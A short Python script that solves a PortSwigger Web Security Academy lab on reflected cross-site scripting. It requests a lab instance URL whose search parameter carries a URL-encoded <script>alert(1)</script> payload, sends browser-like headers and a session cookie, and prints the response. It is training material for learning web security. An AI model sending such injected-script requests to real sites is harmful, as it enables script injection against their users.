import requests as req

# Link to lab: https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded

url='https://acaa1f211f214961c0dc17a7005d0097.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E'
headers={
    'Accept': 'application/vnd.github.v3.text-match+json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Referer': 'https://acaa1f211f214961c0dc17a7005d0097.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'cross-site',
    'Sec-Fetch-User': '?1',
    'Cache-Control': 'max-age=0',
    'Te': 'trailers',
    'Connection': 'close'   
    }
cookies=dict(session='ZrqQJh6ryskgPP2HCw04NpYXO3TWDt')

response=req.get(url, headers=headers,cookies =cookies)

print(response.text)
